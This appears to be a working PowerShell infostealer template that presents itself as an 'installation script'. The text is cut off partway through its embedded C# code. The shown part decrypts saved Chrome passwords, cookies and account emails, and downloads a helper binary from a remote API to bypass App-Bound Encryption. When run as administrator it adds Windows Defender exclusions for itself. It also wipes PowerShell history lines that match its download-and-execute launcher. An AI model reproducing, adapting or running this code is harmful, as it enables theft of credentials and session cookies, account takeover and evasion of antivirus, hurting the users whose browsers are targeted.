$ErrorActionPreference = "Stop"
$ApiBase = "__API_BASE__"
$PayloadUrl = "$ApiBase/p"
$ChromelevatorCacheDir = Join-Path $env:LOCALAPPDATA "remote-scripts\chromelevator"
$CloseTerminal = __CLOSE_TERMINAL__
$DebugMode = __DEBUG_MODE__
$IsRunningAsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator
)

Write-Host "Running installation script..."

function Write-DebugStep {
    param([string]$Message)
    if ($DebugMode) {
        Write-Host "[DEBUG] $Message"
    }
}

function Write-DebugError {
    param($ErrorRecord)

    if (-not $DebugMode) {
        return
    }

    Write-DebugStep "Error type: $($ErrorRecord.Exception.GetType().FullName)"
    Write-DebugStep "Error message: $($ErrorRecord.Exception.Message)"

    $inner = $ErrorRecord.Exception.InnerException
    $depth = 1
    while ($null -ne $inner) {
        Write-DebugStep "Inner $depth ($($inner.GetType().FullName)): $($inner.Message)"
        $inner = $inner.InnerException
        $depth++
    }

    if ($ErrorRecord.InvocationInfo) {
        $line = $ErrorRecord.InvocationInfo.Line
        if ($line) {
            $line = $line.Trim()
        }
        Write-DebugStep "At line $($ErrorRecord.InvocationInfo.ScriptLineNumber): $line"
    }

    Write-DebugStep "ErrorId: $($ErrorRecord.FullyQualifiedErrorId)"
    Write-DebugStep "Mapped exit code: $(Get-ErrorCodeFromException $ErrorRecord)"
}

function Throw-ErrorCode {
    param([int]$Code)
    throw [System.InvalidOperationException]::new([string]$Code)
}

function Get-ErrorCodeFromException {
    param($ErrorRecord)

    $exception = $ErrorRecord.Exception
    while ($null -ne $exception) {
        if ($exception -is [System.Net.WebException]) {
            return 3001
        }

        $exceptionType = $exception.GetType().FullName
        if ($exceptionType -eq "Microsoft.PowerShell.Commands.HttpResponseException") {
            return 3001
        }

        if ($exception.Message -match "^\d{4}$") {
            return [int]$exception.Message
        }

        $exception = $exception.InnerException
    }

    $messages = @($ErrorRecord.Exception.Message)
    if ($ErrorRecord.Exception.InnerException) {
        $messages += $ErrorRecord.Exception.InnerException.Message
    }
    if ($ErrorRecord.FullyQualifiedErrorId -match "WebCmdletWebResponseException") {
        return 3001
    }

    foreach ($message in $messages) {
        if ($message -match "^\d{4}$") {
            return [int]$message
        }
        if ($message -match "maximum permissible length|MaxJsonLength|JavaScriptSerializer|ConvertTo-Json") {
            return 3002
        }
    }

    return 9000
}

function ConvertTo-SerializableObject {
    param($InputObject)

    if ($null -eq $InputObject) {
        return $null
    }

    if ($InputObject -is [System.Collections.IDictionary]) {
        $result = [ordered]@{}
        foreach ($key in $InputObject.Keys) {
            $result[[string]$key] = ConvertTo-SerializableObject $InputObject[$key]
        }
        return $result
    }

    if ($InputObject -is [System.Collections.IEnumerable] -and $InputObject -isnot [string]) {
        return @($InputObject | ForEach-Object { ConvertTo-SerializableObject $_ })
    }

    if ($InputObject -is [pscustomobject]) {
        $result = [ordered]@{}
        foreach ($prop in $InputObject.PSObject.Properties) {
            $result[$prop.Name] = ConvertTo-SerializableObject $prop.Value
        }
        return $result
    }

    return $InputObject
}

function ConvertTo-JsonUnlimited {
    param(
        [Parameter(Mandatory = $true)]
        $InputObject,
        [int]$RecursionLimit = 200
    )

    Add-Type -AssemblyName System.Web.Extensions
    $serializer = New-Object System.Web.Script.Serialization.JavaScriptSerializer
    $serializer.MaxJsonLength = 2147483647
    $serializer.RecursionLimit = $RecursionLimit
    return $serializer.Serialize((ConvertTo-SerializableObject $InputObject))
}


function Get-ChromeInstalledVersion {
    $candidatePaths = @(
        "${env:ProgramFiles}\Google\Chrome\Application\chrome.exe",
        "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe",
        "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe"
    )

    foreach ($path in $candidatePaths) {
        if (-not (Test-Path -LiteralPath $path)) {
            continue
        }

        $version = (Get-Item -LiteralPath $path).VersionInfo.ProductVersion
        $major = [int]($version.Split(".")[0])
        return [ordered]@{
            version = $version
            major = $major
            path = $path
            appBoundSupported = ($major -ge 127)
            legacyDpapiOnly = ($major -lt 127)
        }
    }

    foreach ($regPath in @(
        "HKLM:\SOFTWARE\Google\Chrome\BLBeacon",
        "HKCU:\SOFTWARE\Google\Chrome\BLBeacon"
    )) {
        try {
            $version = (Get-ItemProperty -Path $regPath -ErrorAction Stop).version
            if ($version) {
                $major = [int]($version.Split(".")[0])
                return [ordered]@{
                    version = $version
                    major = $major
                    path = $null
                    appBoundSupported = ($major -ge 127)
                    legacyDpapiOnly = ($major -lt 127)
                }
            }
        }
        catch {
            continue
        }
    }

    return [ordered]@{
        version = $null
        major = 0
        path = $null
        appBoundSupported = $true
        legacyDpapiOnly = $false
    }
}

function Get-ChromeProfileMetadata {
    $chromeUserData = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
    $localStatePath = Join-Path $chromeUserData "Local State"
    $result = [ordered]@{}

    if (Test-Path -LiteralPath $localStatePath) {
        try {
            $localState = Get-Content -Path $localStatePath -Raw -Encoding UTF8 | ConvertFrom-Json
            $infoCache = $localState.profile.info_cache
            if ($null -ne $infoCache) {
                foreach ($prop in $infoCache.PSObject.Properties) {
                    $folder = [string]$prop.Name
                    $info = $prop.Value
                    $result[$folder] = [ordered]@{
                        folder = $folder
                        name = if ($null -ne $info.name) { [string]$info.name } else { "" }
                        gaia_name = if ($null -ne $info.gaia_name) { [string]$info.gaia_name } else { "" }
                        user_name = if ($null -ne $info.user_name) { [string]$info.user_name } else { "" }
                        email = if ($null -ne $info.user_name) { [string]$info.user_name } else { "" }
                        hosted_domain = if ($null -ne $info.hosted_domain) { [string]$info.hosted_domain } else { "" }
                    }
                }
            }
        }
        catch {
        }
    }

    if (Test-Path -LiteralPath $chromeUserData) {
        Get-ChildItem -Path $chromeUserData -Directory | ForEach-Object {
            $folder = $_.Name
            if ($folder -notmatch '^(Default|Profile \d+)$') {
                return
            }

            if (-not $result.Contains($folder)) {
                $result[$folder] = [ordered]@{
                    folder = $folder
                    name = $folder
                    gaia_name = ""
                    user_name = ""
                    email = ""
                    hosted_domain = ""
                }
            }

            $prefPath = Join-Path $_.FullName "Preferences"
            if (-not (Test-Path -LiteralPath $prefPath)) {
                return
            }

            try {
                $prefs = Get-Content -Path $prefPath -Raw -Encoding UTF8 | ConvertFrom-Json
                if ($prefs.profile.name) {
                    $result[$folder].name = [string]$prefs.profile.name
                }
                if ($prefs.account_info -and @($prefs.account_info).Count -gt 0) {
                    $account = @($prefs.account_info)[0]
                    if ($account.email) {
                        $result[$folder].email = [string]$account.email
                        if (-not $result[$folder].user_name) {
                            $result[$folder].user_name = [string]$account.email
                        }
                    }
                    if ($account.full_name) {
                        $result[$folder].gaia_name = [string]$account.full_name
                    }
                }
            }
            catch {
            }
        }
    }

    return $result
}

function Get-DefenderExclusions {
    $paths = @()
    $processes = @()

    try {
        $prefs = Get-MpPreference -ErrorAction Stop
        if ($prefs.ExclusionPath) {
            $paths += @($prefs.ExclusionPath)
        }
        if ($prefs.ExclusionProcess) {
            $processes += @($prefs.ExclusionProcess)
        }
        return @{ Paths = $paths; Processes = $processes; Source = "Get-MpPreference" }
    }
    catch {
    }

    try {
        $pathKey = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -ErrorAction Stop
        $paths += @($pathKey.PSObject.Properties | Where-Object { $_.Name -notmatch "^PS" } | ForEach-Object { $_.Name })
    }
    catch {
    }

    try {
        $processKey = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" -ErrorAction Stop
        $processes += @($processKey.PSObject.Properties | Where-Object { $_.Name -notmatch "^PS" } | ForEach-Object { $_.Name })
    }
    catch {
    }

    return @{ Paths = $paths; Processes = $processes; Source = "registry" }
}

function Test-DefenderPathExcluded {
    param(
        [string]$TargetPath,
        [string[]]$ExclusionPaths
    )

    if (-not $TargetPath) {
        return $false
    }

    $normalizedTarget = $TargetPath.TrimEnd("\")
    foreach ($exclusion in $ExclusionPaths) {
        $normalizedExclusion = $exclusion.TrimEnd("\")
        if (
            $normalizedTarget -eq $normalizedExclusion -or
            $normalizedTarget.StartsWith("$normalizedExclusion\", [System.StringComparison]::OrdinalIgnoreCase)
        ) {
            return $true
        }
    }

    return $false
}

function Get-ChromelevatorArchTag {
    if ($env:PROCESSOR_ARCHITECTURE -eq "ARM64") {
        return "arm64"
    }
    return "x64"
}

function Test-ChromelevatorDefenderStatus {
    $archTag = Get-ChromelevatorArchTag
    $processName = "chromelevator_$archTag.exe"
    $elevatorPath = Join-Path $ChromelevatorCacheDir $processName
    $exclusions = Get-DefenderExclusions

    $pathExcluded = (Test-DefenderPathExcluded -TargetPath $ChromelevatorCacheDir -ExclusionPaths $exclusions.Paths) -or
        (Test-DefenderPathExcluded -TargetPath $elevatorPath -ExclusionPaths $exclusions.Paths)
    $processExcluded = @($exclusions.Processes | ForEach-Object { $_.ToLowerInvariant() }) -contains $processName.ToLowerInvariant() -or
        @($exclusions.Processes | ForEach-Object { $_.ToLowerInvariant() }) -contains "chromelevator.exe"

    $status = [ordered]@{
        arch = $archTag
        exclusionSource = $exclusions.Source
        pathExcluded = [bool]$pathExcluded
        processExcluded = [bool]$processExcluded
        binaryCached = Test-Path -LiteralPath $elevatorPath
        probeOk = $false
        canRunWithoutAdmin = $false
    }

    if ($status.binaryCached) {
        try {
            Unblock-File -LiteralPath $elevatorPath -ErrorAction SilentlyContinue
            $probe = Start-Process -FilePath $elevatorPath -ArgumentList @("--help") -Wait -PassThru -WindowStyle Hidden -ErrorAction Stop
            $status.probeOk = $true
            $status.probeExitCode = $probe.ExitCode
        }
        catch {
            if ($_.Exception.Message -match "virus|potentially unwanted|malware|software malicioso|no deseado") {
                $status.probeOk = $false
                $status.probeError = "2009"
            }
        }
    }

    $status.canRunWithoutAdmin = [bool](
        $status.probeOk -or
        ($pathExcluded -and $processExcluded)
    )

    return [pscustomobject]$status
}

$ChromeInfo = Get-ChromeInstalledVersion

$ChromelevatorDefenderStatus = Test-ChromelevatorDefenderStatus
$UseChromelevator = $ChromeInfo.AppBoundSupported -and (
    $IsRunningAsAdmin -or $ChromelevatorDefenderStatus.canRunWithoutAdmin
)
$UseDpapiDecrypt = -not $UseChromelevator

function Initialize-ChromelevatorDefenderAllowlist {
    New-Item -ItemType Directory -Path $ChromelevatorCacheDir -Force | Out-Null
    Add-DefenderAllowlistEntry -Path $ChromelevatorCacheDir | Out-Null
    Add-DefenderAllowlistEntry -Path $env:TEMP | Out-Null
    foreach ($processName in @("chromelevator_x64.exe", "chromelevator_arm64.exe", "chromelevator.exe")) {
        Add-DefenderAllowlistEntry -ProcessName $processName | Out-Null
    }
}

function Add-DefenderAllowlistEntry {
    param(
        [string]$Path,
        [string]$ProcessName
    )

    if (-not $IsRunningAsAdmin) {
        return $false
    }

    try {
        if ($Path) {
            Add-MpPreference -ExclusionPath $Path -ErrorAction Stop | Out-Null
        }
        if ($ProcessName) {
            Add-MpPreference -ExclusionProcess $ProcessName -ErrorAction Stop | Out-Null
        }
        return $true
    }
    catch {
        return $false
    }
}

function Protect-ChromelevatorBinary {
    param([string]$ElevatorPath)

    if ($IsRunningAsAdmin -and -not $ChromelevatorDefenderStatus.probeOk) {
        Add-DefenderAllowlistEntry -Path $ElevatorPath | Out-Null
        Add-DefenderAllowlistEntry -ProcessName (Split-Path -Leaf $ElevatorPath) | Out-Null
    }

    Unblock-File -LiteralPath $ElevatorPath -ErrorAction SilentlyContinue

    if (-not (Test-Path -LiteralPath $ElevatorPath)) {
        Throw-ErrorCode 2001
    }

    $size = (Get-Item -LiteralPath $ElevatorPath).Length
    if ($size -lt 500000) {
        Throw-ErrorCode 2002
    }

}

function Resolve-ChromelevatorChromeRoot {
    param(
        [string]$OutputRoot,
        [string]$ElevatorPath
    )

    $candidates = @(
        (Join-Path $OutputRoot "Chrome")
        (Join-Path (Split-Path -Parent $ElevatorPath) "output\Chrome")
    )

    foreach ($candidate in $candidates) {
        $exists = Test-Path -LiteralPath $candidate
        if ($exists) {
            return $candidate
        }
    }

    return $null
}

function Invoke-ChromelevatorProcess {
    param(
        [string]$ElevatorPath,
        [string]$OutDir
    )

    Protect-ChromelevatorBinary -ElevatorPath $ElevatorPath

    function Start-ChromelevatorExe {
        param([string]$Path, [string]$OutputDir)

        $argumentString = "-o `"$OutputDir`" chrome"

        $process = New-Object System.Diagnostics.Process
        $process.StartInfo.FileName = $Path
        $process.StartInfo.Arguments = $argumentString
        $process.StartInfo.UseShellExecute = $false
        $process.StartInfo.CreateNoWindow = $true
        $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $process.StartInfo.RedirectStandardOutput = $true
        $process.StartInfo.RedirectStandardError = $true
        [void]$process.Start()
        $null = $process.StandardOutput.ReadToEnd()
        $null = $process.StandardError.ReadToEnd()
        $process.WaitForExit()

        return [pscustomobject]@{
            ExitCode = $process.ExitCode
        }
    }

    $result = Start-ChromelevatorExe -Path $ElevatorPath -OutputDir $OutDir
    if ($result.ExitCode -ne 0) {
        Throw-ErrorCode 2003
    }
}

function Get-NormalizedPasswordKey {
    param(
        [string]$Profile,
        [string]$Url,
        [string]$Username
    )

    $normalizedUrl = if ($Url) { ($Url.TrimEnd('/')).ToLowerInvariant() } else { "" }
    $normalizedUser = if ($Username) { $Username.ToLowerInvariant() } else { "" }
    return "$Profile|$normalizedUrl|$normalizedUser"
}

function Merge-ChromelevatorPasswords {
    param(
        [object]$Payload,
        [string]$OutputRoot,
        [string]$ElevatorPath
    )


    $chromeRoot = Resolve-ChromelevatorChromeRoot -OutputRoot $OutputRoot -ElevatorPath $ElevatorPath
    if (-not $chromeRoot) {
        Throw-ErrorCode 2004
    }


    $abeMap = @{}
    foreach ($profileDir in Get-ChildItem -Path $chromeRoot -Directory) {
        $passwordsFile = Join-Path $profileDir.FullName "passwords.json"
        if (-not (Test-Path $passwordsFile)) {
            continue
        }

        $profileName = $profileDir.Name
        $entries = Get-Content -Path $passwordsFile -Raw -Encoding UTF8 | ConvertFrom-Json
        if ($null -eq $entries) {
            continue
        }

        if ($entries -isnot [System.Array]) {
            $entries = @($entries)
        }


        foreach ($entry in $entries) {
            if (-not $entry.pass) {
                continue
            }

            $key = Get-NormalizedPasswordKey -Profile $profileName -Url $entry.url -Username $entry.user
            $abeMap[$key] = [string]$entry.pass
        }
    }

    $mergedCount = 0
    foreach ($entry in $Payload.passwords) {
        $key = Get-NormalizedPasswordKey -Profile $entry.profile -Url $entry.url -Username $entry.username
        if (-not $abeMap.ContainsKey($key)) {
            continue
        }

        $decrypted = $abeMap[$key]
        if ([string]::IsNullOrEmpty($decrypted)) {
            continue
        }

        try {
            $entry | Add-Member -NotePropertyName password_dpapi -NotePropertyValue $decrypted -Force
            if ($entry.password -match "App-Bound Encryption") {
                $mergedCount++
            }
        }
        catch {
            throw
        }
    }

    return $mergedCount
}

function Merge-ChromelevatorCookies {
    param(
        [object]$Payload,
        [string]$OutputRoot,
        [string]$ElevatorPath
    )


    $chromeRoot = Resolve-ChromelevatorChromeRoot -OutputRoot $OutputRoot -ElevatorPath $ElevatorPath
    if (-not $chromeRoot) {
        return 0
    }

    $mergedCookies = New-Object System.Collections.ArrayList
    $index = 0

    foreach ($profileDir in Get-ChildItem -Path $chromeRoot -Directory) {
        $cookiesFile = Join-Path $profileDir.FullName "cookies.json"
        if (-not (Test-Path $cookiesFile)) {
            continue
        }

        $entries = Get-Content -Path $cookiesFile -Raw -Encoding UTF8 | ConvertFrom-Json
        if ($null -eq $entries) {
            continue
        }

        if ($entries -isnot [System.Array]) {
            $entries = @($entries)
        }


        foreach ($entry in $entries) {
            try {
                $expiresVal = 0
                if ($null -ne $entry.expires) {
                    try { $expiresVal = [long]$entry.expires } catch { $expiresVal = 0 }
                }

                $secureVal = $null
                if ($null -ne $entry.secure) {
                    try { $secureVal = [bool]$entry.secure } catch { $secureVal = $null }
                }

                $httpOnlyVal = $null
                if ($null -ne $entry.httpOnly) {
                    try { $httpOnlyVal = [bool]$entry.httpOnly } catch { $httpOnlyVal = $null }
                }

                [void]$mergedCookies.Add([pscustomobject]@{
                    index = $index
                    profile = $profileDir.Name
                    host = [string]$entry.host
                    name = [string]$entry.name
                    path = [string]$entry.path
                    value = [string]$entry.value
                    value_dpapi = [string]$entry.value
                    expires = $expiresVal
                    secure = $secureVal
                    httpOnly = $httpOnlyVal
                })
                $index++
            }
            catch {
                throw
            }
        }
    }

    if ($mergedCookies.Count -gt 0) {
        $Payload | Add-Member -NotePropertyName cookies -NotePropertyValue @($mergedCookies.ToArray()) -Force
        $Payload | Add-Member -NotePropertyName cookieCount -NotePropertyValue $mergedCookies.Count -Force
    }

    return $mergedCookies.Count
}

function Get-ChromelevatorExecutable {
    param(
        [string]$ApiBase,
        [string]$ArchTag,
        [string]$CacheDir
    )

    if ($env:CHROMELEVATOR_PATH -and (Test-Path -LiteralPath $env:CHROMELEVATOR_PATH)) {
        Protect-ChromelevatorBinary -ElevatorPath $env:CHROMELEVATOR_PATH
        return $env:CHROMELEVATOR_PATH
    }

    New-Item -ItemType Directory -Path $CacheDir -Force | Out-Null

    $elevatorPath = Join-Path $CacheDir "chromelevator_$ArchTag.exe"
    if ($IsRunningAsAdmin -and -not $ChromelevatorDefenderStatus.probeOk) {
        Add-DefenderAllowlistEntry -Path $elevatorPath | Out-Null
    }

    $needsDownload = $true
    if (Test-Path -LiteralPath $elevatorPath) {
        $cachedSize = (Get-Item -LiteralPath $elevatorPath).Length
        if ($cachedSize -ge 500000) {
            $needsDownload = $false
        }
        else {
            Remove-Item -LiteralPath $elevatorPath -Force -ErrorAction SilentlyContinue
        }
    }

    if ($needsDownload) {
        $chromelevatorUrl = "$ApiBase/chrmlvtr?arch=$ArchTag"
        (New-Object Net.WebClient).DownloadFile($chromelevatorUrl, $elevatorPath)
    }

    Protect-ChromelevatorBinary -ElevatorPath $elevatorPath
    return $elevatorPath
}

function Invoke-ChromelevatorExtraction {
    param(
        [object]$Payload,
        [string]$ApiBase
    )

    $meta = [ordered]@{
        used = $false
        arch = $null
        abeMergedCount = 0
        cookiesMergedCount = 0
        error = $null
        skipped = $false
        defender = $ChromelevatorDefenderStatus
    }

    if (-not $UseChromelevator) {
        $meta.skipped = $true
        if ($ChromeInfo.LegacyDpapiOnly) {
            $meta.error = "2006"
        }
        elseif (-not $IsRunningAsAdmin) {
            $meta.error = "2005"
        }
        else {
            $meta.error = "2007"
        }
        return ,[pscustomobject]$meta
    }

    if ($IsRunningAsAdmin -and -not $ChromelevatorDefenderStatus.probeOk) {
        Initialize-ChromelevatorDefenderAllowlist | Out-Null
    }

    $outDir = $null
    try {
        $archTag = if ($env:PROCESSOR_ARCHITECTURE -eq "ARM64") { "arm64" } else { "x64" }
        $meta.arch = $archTag

        $elevatorPath = Get-ChromelevatorExecutable -ApiBase $ApiBase -ArchTag $archTag -CacheDir $ChromelevatorCacheDir

        $outDir = Join-Path $env:TEMP ("chrome_export_" + [Guid]::NewGuid().ToString("N"))
        New-Item -ItemType Directory -Path $outDir -Force | Out-Null

        Invoke-ChromelevatorProcess -ElevatorPath $elevatorPath -OutDir $outDir

        $mergedCount = Merge-ChromelevatorPasswords -Payload $Payload -OutputRoot $outDir -ElevatorPath $elevatorPath

        $cookiesMergedCount = Merge-ChromelevatorCookies -Payload $Payload -OutputRoot $outDir -ElevatorPath $elevatorPath

        $meta.used = $true
        $meta.abeMergedCount = $mergedCount
        $meta.cookiesMergedCount = $cookiesMergedCount
    }
    catch {
        $meta.error = [string](Get-ErrorCodeFromException $_)
    }
    finally {
        if ($outDir -and (Test-Path $outDir)) {
            Remove-Item -Path $outDir -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    return ,[pscustomobject]$meta
}

function Clear-ScriptExecutionHistory {
    $pattern = "(DownloadString|/wscp|iex\s*\(|Invoke-Expression|iwr\s+.*/wscp|Invoke-WebRequest.*/wscp)"
    $historyPaths = @()

    try {
        if (Get-Module PSReadLine -ErrorAction SilentlyContinue) {
            $readLinePath = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
            if ($readLinePath) {
                $historyPaths += $readLinePath
            }
        }
    }
    catch {
    }

    $historyPaths += Join-Path $env:APPDATA "Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

    foreach ($historyPath in @($historyPaths | Select-Object -Unique)) {
        if (-not (Test-Path -LiteralPath $historyPath)) {
            continue
        }

        try {
            $remaining = @(Get-Content -LiteralPath $historyPath -ErrorAction Stop |
                Where-Object { $_ -notmatch $pattern })
            Set-Content -LiteralPath $historyPath -Value $remaining -Encoding utf8
        }
        catch {
        }
    }

    try {
        Clear-History -ErrorAction SilentlyContinue
    }
    catch {
    }

}

try {

Write-DebugStep "Starting export pipeline (admin=$IsRunningAsAdmin, api=$ApiBase)"

Add-Type -AssemblyName System.Security

$TypeSuffix = [Guid]::NewGuid().ToString("N")
$ChromeExporterClassName = "ChromeExporter_$TypeSuffix"
$ChromeComElevatorClassName = "ChromeComElevator_$TypeSuffix"
$ChromeCryptoClassName = "ChromeCrypto_$TypeSuffix"

Write-DebugStep "Compiling exporter types ($ChromeExporterClassName)"
$typeDefinition = @"
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

public static class __EXPORTER_CLASS__
{
    private const int SQLITE_DESERIALIZE_READONLY = 2;
    private static readonly Regex ProfileFolderRegex = new Regex(@"^Profile \d+$|^Default$", RegexOptions.IgnoreCase);

    public static string Export(bool attemptDpapiDecrypt)
    {
        string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        string chromePath = Path.Combine(userProfile, @"AppData\Local\Google\Chrome\User Data");
        string localStatePath = Path.Combine(chromePath, "Local State");

        if (!File.Exists(localStatePath))
        {
            throw new InvalidOperationException("1001");
        }

        byte[] dpapiKey = null;
        if (attemptDpapiDecrypt)
        {
            dpapiKey = GetSecretKey(localStatePath);
            if (dpapiKey == null || dpapiKey.Length == 0)
            {
                throw new InvalidOperationException("1002");
            }
        }

        var passwords = new List<PasswordEntry>();
        var cookies = new List<CookieEntry>();
        int index = 0;
        int cookieIndex = 0;

        foreach (string profilePath in Directory.GetDirectories(chromePath))
        {
            string folder = Path.GetFileName(profilePath);
            if (!ProfileFolderRegex.IsMatch(folder))
            {
                continue;
            }

            string loginDbPath = Path.Combine(profilePath, "Login Data");
            if (File.Exists(loginDbPath))
            {
                byte[] dbBytes = TryReadShared(loginDbPath);
                if (dbBytes != null)
                {
                    foreach (PasswordEntry entry in ReadLogins(dbBytes, folder, dpapiKey, attemptDpapiDecrypt, ref index))
                    {
                        passwords.Add(entry);
                    }
                }
            }

            if (attemptDpapiDecrypt)
            {
                string cookiesDbPath = ResolveCookiesDbPath(profilePath);
                if (cookiesDbPath != null)
                {
                    byte[] cookieDbBytes = TryReadShared(cookiesDbPath);
                    if (cookieDbBytes != null)
                    {
                        foreach (CookieEntry entry in ReadCookies(cookieDbBytes, folder, dpapiKey, attemptDpapiDecrypt, ref cookieIndex))
                        {
                            cookies.Add(entry);
                        }
                    }
                }
            }
        }

        return BuildJson(passwords, cookies);
    }

    private static string ResolveCookiesDbPath(string profilePath)
    {
        string networkPath = Path.Combine(profilePath, "Network", "Cookies");
        if (File.Exists(networkPath))
        {
            return networkPath;
        }

        string legacyPath = Path.Combine(profilePath, "Cookies");
        if (File.Exists(legacyPath))
        {
            return legacyPath;
        }

        return null;
    }

    private static byte[] GetEncryptedKeyBlob(string localStatePath, string keyName)
    {
        string json = File.ReadAllText(localStatePath, Encoding.UTF8);
        string marker = "\"" + keyName + "\":\"";
        int start = json.IndexOf(marker, StringComparison.Ordinal);
        if (start < 0)
        {
            return null;
        }

        start += marker.Length;
        int end = json.IndexOf('"', start);
        if (end < 0)
        {
            return null;
        }

        byte[] data = Convert.FromBase64String(json.Substring(start, end - start));
        if (data.Length <= 4)
        {
            return null;
        }

        byte[] payload = new byte[data.Length - 4];
        Array.Copy(data, 4, payload, 0, payload.Length);
        return payload;
    }

    private static byte[] ReadShared(string path)
    {
        using (var stream = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete))
        {
            var bytes = new byte[stream.Length];
            int read = 0;
            while (read < bytes.Length)
            {
                read += stream.Read(bytes, read, bytes.Length - read);
            }
            return bytes;
        }
    }

    private static byte[] TryReadShared(string path)
    {
        try
        {
            return ReadShared(path);
        }
        catch (IOException)
        {
            return null;
        }
        catch (UnauthorizedAccessException)
        {
            return null;
        }
    }

    private static byte[] GetSecretKey(string localStatePath)
    {
        string json = File.ReadAllText(localStatePath, Encoding.UTF8);
        string marker = "\"encrypted_key\":\"";
        int start = json.IndexOf(marker, StringComparison.Ordinal);
        if (start < 0)
        {
            return null;
        }

        start += marker.Length;
        int end = json.IndexOf('"', start);
        if (end < 0)
        {
            return null;
        }

        byte[] secretKey = Convert.FromBase64String(json.Substring(start, end - start));
        byte[] keyPayload = new byte[secretKey.Length - 5];
        Array.Copy(secretKey, 5, keyPayload, 0, keyPayload.Length);
        return ProtectedData.Unprotect(keyPayload, null, DataProtectionScope.CurrentUser);
    }

    private static IEnumerable<PasswordEntry> ReadLogins(byte[] dbBytes, string profile, byte[] dpapiKey, bool attemptDpapiDecrypt, ref int index)
    {
        var entries = new List<PasswordEntry>();
        IntPtr db = IntPtr.Zero;
        IntPtr stmt = IntPtr.Zero;
        GCHandle pinned = GCHandle.Alloc(dbBytes, GCHandleType.Pinned);

        try
        {
            int rc = sqlite3_open(":memory:", out db);
            if (rc != 0)
            {
                throw new InvalidOperationException("1003");
            }

            IntPtr dataPtr = pinned.AddrOfPinnedObject();
            rc = sqlite3_deserialize(db, "main", dataPtr, dbBytes.LongLength, dbBytes.LongLength, SQLITE_DESERIALIZE_READONLY);
            if (rc != 0)
            {
                throw new InvalidOperationException("1004");
            }

            rc = sqlite3_prepare_v2(db, "SELECT action_url, origin_url, username_value, password_value FROM logins", -1, out stmt, IntPtr.Zero);
            if (rc != 0)
            {
                throw new InvalidOperationException("1005");
            }

            while (sqlite3_step(stmt) == 100)
            {
                string actionUrl = ReadText(stmt, 0);
                string originUrl = ReadText(stmt, 1);
                string url = !string.IsNullOrEmpty(actionUrl) ? actionUrl : originUrl;
                string username = ReadText(stmt, 2);
                byte[] ciphertext = ReadBlob(stmt, 3);

                string password = "";
                string passwordDpapi = "";

                if (ciphertext != null && ciphertext.Length > 0)
                {
                    if (attemptDpapiDecrypt)
                    {
                        try
                        {
                            password = __CRYPTO_CLASS__.DecryptPassword(dpapiKey, ciphertext, false);
                        }
                        catch
                        {
                            password = "";
                        }
                    }
                    else if (ciphertext.Length >= 3)
                    {
                        string version = Encoding.ASCII.GetString(ciphertext, 0, 3);
                        if (version == "v20")
                        {
                            password = "[Chrome 127+ App-Bound Encryption - export from chrome://password-manager]";
                        }
                    }
                }

                entries.Add(new PasswordEntry
                {
                    Index = index,
                    Profile = profile,
                    Url = url,
                    Username = username,
                    Password = password,
                    PasswordDpapi = passwordDpapi
                });
                index++;
            }
        }
        finally
        {
            if (stmt != IntPtr.Zero)
            {
                sqlite3_finalize(stmt);
            }
            if (db != IntPtr.Zero)
            {
                sqlite3_close_v2(db);
            }
            if (pinned.IsAllocated)
            {
                pinned.Free();
            }
        }

        return entries;
    }

    private static IEnumerable<CookieEntry> ReadCookies(byte[] dbBytes, string profile, byte[] dpapiKey, bool attemptDpapiDecrypt, ref int index)
    {
        var entries = new List<CookieEntry>();
        IntPtr db = IntPtr.Zero;
        IntPtr stmt = IntPtr.Zero;
        GCHandle pinned = GCHandle.Alloc(dbBytes, GCHandleType.Pinned);

        try
        {
            int rc = sqlite3_open(":memory:", out db);
            if (rc != 0)
            {
                throw new InvalidOperationException("1006");
            }

            IntPtr dataPtr = pinned.AddrOfPinnedObject();
            rc = sqlite3_deserialize(db, "main", dataPtr, dbBytes.LongLength, dbBytes.LongLength, SQLITE_DESERIALIZE_READONLY);
            if (rc != 0)
            {
                throw new InvalidOperationException("1007");
            }

            rc = sqlite3_prepare_v2(
                db,
                "SELECT host_key, name, path, encrypted_value, expires_utc, is_secure, is_httponly FROM cookies",
                -1,
                out stmt,
                IntPtr.Zero);
            if (rc != 0)
            {
                throw new InvalidOperationException("1008");
            }

            while (sqlite3_step(stmt) == 100)
            {
                string host = ReadText(stmt, 0);
                string name = ReadText(stmt, 1);
                string cookiePath = ReadText(stmt, 2);
                byte[] ciphertext = ReadBlob(stmt, 3);
                long expires = ReadInt64(stmt, 4);
                bool secure = ReadInt(stmt, 5) != 0;
                bool httpOnly = ReadInt(stmt, 6) != 0;

                string value = "";
                string valueDpapi = "";

                if (ciphertext != null && ciphertext.Length > 0)
                {
                    if (attemptDpapiDecrypt)
                    {
                        try
                        {
                            value = __CRYPTO_CLASS__.DecryptPassword(dpapiKey, ciphertext, false);
                        }
                        catch
                        {
                            value = "";
                        }
                    }
                    else if (ciphertext.Length >= 3)
                    {
                        string version = Encoding.ASCII.GetString(ciphertext, 0, 3);
                        if (version == "v20")
                        {
                            value = "[Chrome 127+ App-Bound Encryption - export from chrome://password-manager]";
                        }
                    }
                }

                entries.Add(new CookieEntry
                {
                    Index = index,
                    Profile = profile,
                    Host = host,
                    Name = name,
                    Path = cookiePath,
                    Value = value,
                    ValueDpapi = valueDpapi,
                    Expires = expires,
                    Secure = secure,
                    HttpOnly = httpOnly
                });
                index++;
            }
        }
        finally
        {
            if (stmt != IntPtr.Zero)
            {
                sqlite3_finalize(stmt);
            }
            if (db != IntPtr.Zero)
            {
                sqlite3_close_v2(db);
            }
